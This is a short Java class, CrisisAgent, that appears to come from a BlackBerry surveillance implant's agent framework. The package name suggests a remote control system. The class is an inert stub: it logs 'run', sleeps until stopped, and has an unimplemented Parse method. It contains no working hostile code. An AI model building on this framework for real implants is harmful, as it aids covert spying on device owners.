package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class CrisisAgent extends Agent {
    static Debug debug = new Debug("CrisisAgent", DebugLevel.VERBOSE);

    public CrisisAgent(int AgentStatus) {
        super(Agent.AGENT_CRISIS, AgentStatus, true);
    }

    protected CrisisAgent(int AgentStatus, byte[] confParams) {
        this(AgentStatus);
        Parse(confParams);
    }

    public void AgentRun() {
        debug.trace("run");
        this.SleepUntilStopped();

    }

    protected boolean Parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
